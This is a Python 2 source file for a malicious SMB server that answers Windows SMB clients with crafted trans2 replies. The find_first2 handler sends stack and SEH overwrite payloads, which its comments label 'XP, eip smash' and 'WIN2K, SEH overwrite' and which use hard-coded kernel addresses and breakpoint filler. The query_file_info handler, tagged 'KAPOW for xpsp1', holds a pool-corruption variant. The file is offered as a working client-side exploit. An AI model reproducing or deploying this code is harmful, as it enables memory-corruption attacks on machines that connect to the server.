#! /usr/bin/env python

from msrpc import *
import socket
import struct

#####################################################################
NETBIOS_SESSION_REQUEST=0x81
SMB_TREE_CONNECT=0x70
SMB_NEGOTIATE_PROTOCOL=0x72
SMB_SESSION_SETUP_ANDX=0x73
SMB_TREE_CONNECT_ANDX=0x75
SMB_CHECK_DIRECTORY=0x10
SMB_ECHO_REQUEST=0x2b
SMB_SUCCESS=0
SMB_CREATE_ANDX=0xa2
SMB_CLOSE=0x4
SMB_TREE_DISCONNECT=0x71
#SMB_QUERY_FILE_INFORMATION=0xff #???
SMB_TRANS2=0x32

GET_DFS_REFERRAL=0x0010
QUERY_FILE_INFO=0x0007
FIND_FIRST2=0x0001
QUERY_PATH_INFO=0x0005
QUERY_FS_INFO=0x0003

class SMBServer:
    """
    A useful little SMB Server
    """
    def __init__(self,host,port,getsock=None):
        self.getsock=getsock
        self.host=host
        self.port=port
        self.files={}
        self.clientsock=None

        #these functions take 2 arguments, header (tuple) and body (string data)
        response_functions={}
        response_functions[SMB_NEGOTIATE_PROTOCOL]=self.negotiateprotocol
        response_functions[SMB_SESSION_SETUP_ANDX]=self.sessionsetup_andx
        response_functions[SMB_TREE_CONNECT_ANDX]=self.treeconnect_andx
        response_functions[SMB_TREE_CONNECT]=self.treeconnect
        response_functions[SMB_CHECK_DIRECTORY]=self.checkdirectory
        response_functions[SMB_ECHO_REQUEST]=self.echo
        response_functions[SMB_CREATE_ANDX]=self.create_andx
        response_functions[SMB_CLOSE]=self.smbclose
        response_functions[SMB_TREE_DISCONNECT]=self.treedisconnect
        response_functions[SMB_TRANS2]=self.trans2
        
        trans2_response_functions={}
        trans2_response_functions[GET_DFS_REFERRAL]=self.get_dfs_referral
        #trans2_response_functions[GET_DFS_REFERRAL]=self.query_file_info
        trans2_response_functions[QUERY_FILE_INFO]=self.query_file_info
        trans2_response_functions[FIND_FIRST2]=self.find_first2
        trans2_response_functions[QUERY_PATH_INFO]=self.query_path_info
        trans2_response_functions[QUERY_FS_INFO]=self.query_fs_info

        self.trans2_response_functions=trans2_response_functions
        self.response_functions=response_functions
        self.tid=1
        return

    def listen(self):
        """listen on the socket"""
        if self.getsock:
            self.s=self.getsock.gettcplistener(port,host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            try:
                s.bind((self.host, self.port))
                s.listen(5)
            except:
                return 0
            self.s=s

        return 1
    
    def set_file_data(self,name,data):
        """any file you retrieve from the server with a particular name is this file"""
        self.files[name]=data
        return

    def accept(self):
        """Accept a connection from an SMB Client"""
        self.s.set_timeout(500)
        try: 
            (s2,addr)=self.s.accept()
        except:
            #failed
            print "SMBServer accept failed"
            return 0
        print "SMBServer accept succeeded from host %s:%s"%(addr)
        self.clientsock=s2
        return 1
        
    def handle(self):
        if self.clientsock==None:
            print "Trying to handle, but no client socket"
            return 0
        print "Attempting to handle a request from the client"
        try:
            data=recvnetbios_server(self.clientsock)
        except IndexError:
            print "Connection closed."
            return 0
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            return 0
        self.respond_to_netbios_request(data)
        return 1
        
    def respond_to_netbios_request(self,data):
        """Respond to a packet"""
        print "Responding to netbios request"
        if ord(data[0])==NETBIOS_SESSION_REQUEST:
            #we have to respond to a session request if we are on port 139
            print "Session request ... responding with success"
            netbiosresponse="\x82"+"\x00"*3 #simple
            self.clientsock.sendall(netbiosresponse)
        else:
            #just handle the smb request now...
            self.respond_to_smb_request(data[4:])
            
    def respond_to_smb_request(self,data):
        print "responding to smb request"
        format="<4sBLBH12sHHHHB"
        size=struct.calcsize(format)
        out=struct.unpack(format,data[:size])
        (_,cmd,status,flags,flags2,sig,tid,pid,uid,mid,wordcount)=out
        self.pid=pid
        self.uid=uid
        self.mid=mid
        params=data[size:size+wordcount*2]
        data2=data[size+wordcount*2:]
        if cmd not in self.response_functions.keys():
            print "%x not in response functions!"%cmd
            return 0
        self.response_functions[cmd](out,data[size:])
        return 1
        
    def sendsmb(self,cmd, status, flags, flags2, tid, mid, params = '', data = ''):
        uid=0
        wordcount=len(params)/2
        if len(params) & 1:
            print "Odd length of params is not supported..."
        print "Length of data=%s"%len(data)
        print "data=%s"%hexprint(data)
        pkt=struct.pack('<4sBLBH12sHHHHB', '\xffSMB', cmd, status, flags, flags2, '\0' * 12, 
                        tid, self.pid, self.uid, mid, wordcount) + params + struct.pack('<H', len(data)) + data
        pkt=netbios(pkt)
        self.clientsock.sendall(pkt)
        return 
    
    def parsesmb(self,data):
        """not used"""
        format='<4sBLBH12sHHHHB'
        _,cmd,status,flags,flags2,session,tid,pid,uid,mid,wordcount=struct.unpack(format,data)
        wordcount=wordcount*2
        params=data[size:size+wordcount]
        data2=data[size+wordcount:]
        bytecount=struct.unpack("<H",data2)
        ret={}
        ret["cmd"]=cmd
        ret["status"]=status
        ret["flags"]=flags
        ret["flags2"]=flags2
        ret["session"]=session #ingored
        ret["tid"]=tid
        ret["pid"]=pid
        ret["uid"]=uid
        ret["mid"]=mid
        ret["params"]=params
        ret["data"]=data
        return 
                 
    #### protocol handlers
    
    def negotiateprotocol(self,header,body):
        wordcount=header[10]
        params=body[:wordcount*2]
        data=body[wordcount*2:]
        prots=data.split("\x02")
        print prots
        index=prots.index("NT LM 0.12\x00")
        print "Neg prot"
        flags=0x88
        flags2=0xc001
        mid=1
        paramformat="<HBHHLLLL8sHB"
        dialectindex=index-1
        securitymode=0x3
        maxmpxcount=50
        maxVCs=1
        maxbuffersize=16644
        maxrawbuffer=65536
        sessionkey=0
        capabilities=0x0000f3fd
        systemtime="\x00"*8
        servertimezone=0x01e0
        key="\x00"*8 #we need to fuzz this
        keylength=len(key)
        params=struct.pack(paramformat, dialectindex,securitymode,maxmpxcount,maxVCs,maxbuffersize,
                           maxrawbuffer,sessionkey,capabilities,systemtime,servertimezone,keylength)
        data=key+msunistring("VMWARE")+msunistring("WIN2KSRV")
        self.sendsmb(SMB_NEGOTIATE_PROTOCOL,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
        
    def sessionsetup_andx(self,header,body):
        flags=0x88
        flags2=0xc001

        #andx stuff
        andxcommand=0xff
        reserved=0x00
        andxoffset=0
        optionalsupport=0x0001
        action=1 #logged in as guest
        tup=(andxcommand,reserved,andxoffset,action)
        params=struct.pack('<BBHH',*tup)

        #one byte of padding
        data="\x00"+msunistring("OS")+msunistring("LANMAN")
        print "Sessionsetup"
        self.sendsmb(SMB_SESSION_SETUP_ANDX,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
    
    def smbclose(self,header,body):
        cmd=header[1]
        flags=0x88
        flags2=0xc001
        params=""
        data=""
        print "close"
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
    
    def treedisconnect(self,header,body):
        cmd=header[1]
        flags=0x88
        flags2=0xc001
        params=""
        data=""
        print "tree disconnect"
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
    
    def treeconnect_andx(self,header,body):
        notes="""
        http://ubiqx.org/cifs/figures/smb-05.html
        The AndXOffset value in each AndX parameter block gives
        the offset (relative to the start of the SMB) of the next AndX block.
        The AndXOffset of the last AndX block has a value of zero (0).
        
        whatever.
        """
        print "Treeconnect"
        cmd=header[1]
        flags=0x88
        flags2=0xc001
        andxcommand=0xff
        reserved=0x00
        paramformat="<BBHH"
        andxoffset=0
        optionalsupport=0x0001
        data="A:\x00"+msunistring("NTFS")
        #data="Q"*1025+"\x00"+msunistring("DFS"*50)
        params=struct.pack(paramformat,andxcommand,reserved,andxoffset,optionalsupport)
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
    
    def create_andx(self,header,body):
        print "Handing create_andx"
        params=""
        data=""
        
        cmd=header[1]
        flags=0x88
        flags2=0xc001
        andxcommand=0xff
        reserved=0x00
        paramformat="<BBHBHL8s8s8s8sLLLLLHHB"
        andxoffset=0
        oplock=2 #batch oplock granted
        self.fid=random.randint(10,540) & 0xfffffff0L
        createaction=1
        print "Set self.fid to %2x"%self.fid
        #data="A"*12
        zero=0
        faketime=binstring("e05eae8a1b6fc401")
        allocationsize=1024
        endoffile=allocationsize
        fileattributes=0x80 #normal
        filetype=0
        ipcstate=0 #eh?
        isdirectory=0
        params=struct.pack(paramformat,
                           andxcommand,reserved,andxoffset,oplock,self.fid,createaction,
                           faketime,faketime,faketime,faketime,fileattributes,
                           allocationsize,0,endoffile,0,filetype,ipcstate,isdirectory)
        #params+="A"*20
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)

    def treeconnect(self,header,body):
        print "Treeconnect"
        cmd=header[1]
        flags=0x88
        flags2=0xc001
        paramformat="<HH"
        maxbuf=1024
        treeid=self.tid
        #data=msunistring("A:NTFS")
        data=""
        params=struct.pack(paramformat,maxbuf,treeid)
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
    
    def checkdirectory(self,header,body):
        flags=0x88
        flags2=0xc001
        params=""
        data=""
        print "Sessionsetup"
        self.sendsmb(SMB_CHECK_DIRECTORY,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,data)
        return 1
        
    def echo(self,header,body):
        cmd=header[1]
        wordcount=header[10]
        params=body[:wordcount*2]
        data=body[wordcount*2:]
        echocount=struct.unpack("<H",params)
        bytecount=struct.unpack("<H",data)
        echodata=data[2:2+bytecount]*echocount
        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,"",echodata)
        return 1
    
    def trans2(self,header,body):
        print "trans2"
        flags=0x88
        flags2=0xc001
        outparams=""
        outdata=""        
        
        cmd=header[1]
        wordcount=header[10]
        params=body[:wordcount*2]
        data=body[wordcount*2:]
        paramstring="<HHHHBBHLHHHHHBBH"
        paramsize=struct.calcsize(paramstring)
        print "Paramsize=%d len params=%d"%(paramsize,len(params))
        print "Data=%s"%hexprint(params)
        tup=struct.unpack(paramstring,params[:paramsize])
        (totalparamcount,totaldatacount,maxparamcount,maxdatacount,
         maxsetupcount,_,trans2flags,timeout,_,paramcount,paramoffset,
         datacount,dataoffset,setupcount,_,subcommand)=tup
        outsetup,outparams,outdata=self.trans2_response_functions[subcommand](tup,data)

        totalparamcount=0
        totaldatacount=0
        reserved=0
        timeout=0
        paramcount=len(outparams)
        setupcount=len(outsetup)
        paramoffset=56+setupcount
        paramdisplacement=0
        datadisplacement=0
        dataoffset=paramoffset+paramcount
        
        paramfs="<HHHHHHHHHBB"
        padnum=1
        padding="\x00"*padnum
        tup=(totalparamcount,totaldatacount,reserved,paramcount,paramoffset,
             paramdisplacement,datacount,dataoffset,datadisplacement,
             setupcount,reserved)
        params=struct.pack(paramfs,*tup)

        self.sendsmb(cmd,SMB_SUCCESS,flags,flags2,self.tid,self.mid,params,padding+outparams+outsetup+outdata)
        return 1
    
    def get_dfs_referral(self,header,body):
        print "Get dfs referral"
        params=""
        data="" #A"*20
        setup=""
        return setup,params,data
    
    def query_file_info(self,header,body):
        """KAPOW for xpsp1"""
        params="B"*10
        #params = "B"*20+"\x00\x00\x00\x00"+"B"*40+struct.pack("<L", 0xdeadbeefL)
        #NULL for the pool pointer
        #data = struct.pack("<L", 0xbabebabeL) + "C"*1600
        data = "C"*10
        setup=""
        return setup,params,data

    
    def query_fs_info(self,header,body):
        params=""
        data=""
        setup=""
        return setup,params,data

    
    def find_first2(self,header,body):
        #check gapple_client! this function is overloaded there    
        #params="D"*116
        if 0: 
            #XP, eip smash
            params="\x00"*104 + struct.pack("<L", 0xbabebabeL) + struct.pack("<L", 0x80500a8bL) + "\xcc"*600
        else:
            #WIN2K, SEH overwrite
            #ExecuteHandler+0x24: 8046a04f
            #handler addr: jmp edi 0xff 0xe7 points to next dword, jmp ebx to prior
            params="\x00"*108 + struct.pack("<L", 0xbabebabeL) + struct.pack("<L", 0xbeefbeefL) + "\xcc"*0x90 +\
                  struct.pack("<L", 0xbabebabeL) + struct.pack("<L", 0x800f4928L) + "\xcc"*600
                  
        data="D"*20
        setup=""
        return setup,params,data

    
    def query_path_info(self,header,body):
        params=intel_order(0)
        data=""
        setup=""
        return setup,params,data

    
    
if __name__=="__main__":
    print "Starting smb server"
    mysmbserver=SMBServer("0.0.0.0",445)
    if mysmbserver.listen()==0:
        print "Could not listen!"
        sys.exit(1)
    print "Accepting"
    mysmbserver.accept()
    if 1:
        while mysmbserver.handle():
            print "Handled."
        time.sleep(1)
    print "Sleeping"
    time.sleep(10)        
